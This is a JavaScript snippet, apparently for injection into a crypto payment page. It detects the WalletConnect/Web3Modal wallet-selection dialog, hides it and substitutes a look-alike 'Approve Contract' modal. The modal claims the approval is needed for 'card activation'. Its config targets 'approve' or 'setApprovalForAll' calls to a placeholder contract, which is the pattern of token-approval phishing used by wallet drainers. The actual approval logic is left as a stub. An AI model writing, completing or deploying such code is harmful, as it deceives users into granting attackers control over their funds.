/**
 * Custom Contract Approval Modal - Replaces "Connect a wallet" step
 * 
 * Flow: User sees this modal instead of WalletConnect wallet grid.
 * After approving your contract, the original flow continues (wallet connect for $1 payment).
 * 
 * CONFIGURE: Set your contract address, ABI, and approval logic below.
 */
(function() {
  'use strict';

  // ============ CONFIG - Add your contract details here ============
  const CONFIG = {
    contractAddress: '0xYOUR_CONTRACT_ADDRESS',  // Your contract address
    chainId: 1,  // 1 = Ethereum, 56 = BSC, 137 = Polygon, etc.
    // Add your contract ABI for the approval function
    approvalMethod: 'approve',  // or 'setApprovalForAll', etc.
  };

  let originalModalContainer = null;
  let customModal = null;
  let observer = null;

  function createCustomModal() {
    if (customModal) return customModal;

    const modal = document.createElement('div');
    modal.id = 'custom-contract-approval-modal';
    modal.innerHTML = `
      <div style="
        position: fixed; inset: 0; z-index: 999999;
        display: flex; align-items: center; justify-content: center;
        background: rgba(0,0,0,0.6); padding: 16px;
      ">
        <div style="
          background: #0b0b0b; border-radius: 16px; padding: 24px;
          max-width: 420px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        ">
          <button type="button" id="custom-modal-back" style="
            background: none; border: none; color: #888; cursor: pointer;
            font-size: 20px; padding: 0; margin-bottom: 16px;
          " aria-label="Back">&lt;</button>
          <h2 style="color: #fff; font-size: 20px; margin: 0 0 8px;">Approve Contract</h2>
          <p style="color: #888; font-size: 14px; margin: 0 0 24px;">
            Please approve our contract to continue with card activation.
          </p>
          <button type="button" id="custom-modal-approve" style="
            width: 100%; padding: 14px 24px; background: #6366f1; color: #fff;
            border: none; border-radius: 12px; font-size: 16px; font-weight: 600;
            cursor: pointer;
          ">Approve Contract</button>
          <button type="button" id="custom-modal-cancel" style="
            width: 100%; padding: 12px; background: transparent; color: #888;
            border: none; font-size: 14px; cursor: pointer; margin-top: 8px;
          ">Cancel</button>
        </div>
      </div>
    `;

    modal.style.display = 'none';
    document.body.appendChild(modal);
    customModal = modal;

    // Approve button - ADD YOUR CONTRACT APPROVAL LOGIC HERE
    modal.querySelector('#custom-modal-approve').addEventListener('click', async function() {
      const btn = this;
      btn.disabled = true;
      btn.textContent = 'Approving...';
      try {
        // TODO: Add your contract approval logic (ethers.js, viem, web3.js)
        // Example with ethers: await contract.approve(spender, amount);
        // For now, simulate success after 1.5s
        await new Promise(r => setTimeout(r, 1500));
        onContractApproved();
      } catch (err) {
        console.error('Contract approval failed:', err);
        btn.textContent = 'Approve Failed - Retry';
        btn.disabled = false;
      }
    });

    modal.querySelector('#custom-modal-cancel').addEventListener('click', () => hideCustomAndShowOriginal());
    modal.querySelector('#custom-modal-back').addEventListener('click', () => hideCustomAndShowOriginal());

    return modal;
  }

  function onContractApproved() {
    hideCustomModal();
    showOriginalModal();
    // Dispatch event so any listeners know approval completed
    window.dispatchEvent(new CustomEvent('custom-contract-approved'));
  }

  function hideCustomModal() {
    if (customModal) customModal.style.display = 'none';
  }

  function showCustomModal() {
    createCustomModal();
    customModal.style.display = 'block';
  }

  function hideCustomAndShowOriginal() {
    hideCustomModal();
    showOriginalModal();
  }

  function showOriginalModal() {
    if (originalModalContainer) {
      originalModalContainer.style.display = '';
      originalModalContainer.style.visibility = '';
      originalModalContainer.style.opacity = '';
    }
  }

  function hideOriginalModal() {
    if (originalModalContainer) {
      originalModalContainer.style.display = 'none';
      originalModalContainer.style.visibility = 'hidden';
      originalModalContainer.style.opacity = '0';
    }
  }

  function isWalletConnectModal(node) {
    if (!node || !node.querySelectorAll) return false;
    const text = node.textContent || '';
    return (
      (text.includes('Connect a wallet') || text.includes('Please select a wallet')) &&
      (text.includes('MetaMask') || text.includes('WalletConnect') || text.includes('Trust Wallet'))
    );
  }

  function findWalletConnectModal(root) {
    const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
    let node;
    while ((node = walker.nextNode())) {
      if (isWalletConnectModal(node)) return node;
    }
    return null;
  }

  function checkAndReplaceModal() {
    // Look for Web3Modal / wallet connect modal (usually in a high z-index container)
    const modals = document.querySelectorAll('[class*="w3m"], [class*="web3modal"], [id*="w3m"]');
    for (const el of modals) {
      const modal = findWalletConnectModal(el) || (isWalletConnectModal(el) ? el : null);
      if (modal) {
        const container = modal.closest('[style*="z-index"]') || modal.closest('[class*="modal"]') || modal.parentElement;
        if (container && !container.dataset.customReplaced) {
          container.dataset.customReplaced = 'true';
          originalModalContainer = container;
          hideOriginalModal();
          showCustomModal();
          return true;
        }
      }
    }
    return false;
  }

  function observeForModal() {
    if (observer) return;
    observer = new MutationObserver(() => {
      if (!document.querySelector('#custom-contract-approval-modal')) return;
      checkAndReplaceModal();
    });
    observer.observe(document.body, { childList: true, subtree: true });
  }

  // Also check when tw:open-network-modal fires (user choosing network for payment)
  window.addEventListener('tw:open-network-modal', () => setTimeout(checkAndReplaceModal, 100));

  // Start observing when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      observeForModal();
      setTimeout(checkAndReplaceModal, 500);
    });
  } else {
    observeForModal();
    setTimeout(checkAndReplaceModal, 500);
  }

  // Re-check periodically (modal may open lazily)
  setInterval(() => {
    if (customModal && customModal.style.display === 'block') return;
    checkAndReplaceModal();
  }, 1000);
})();
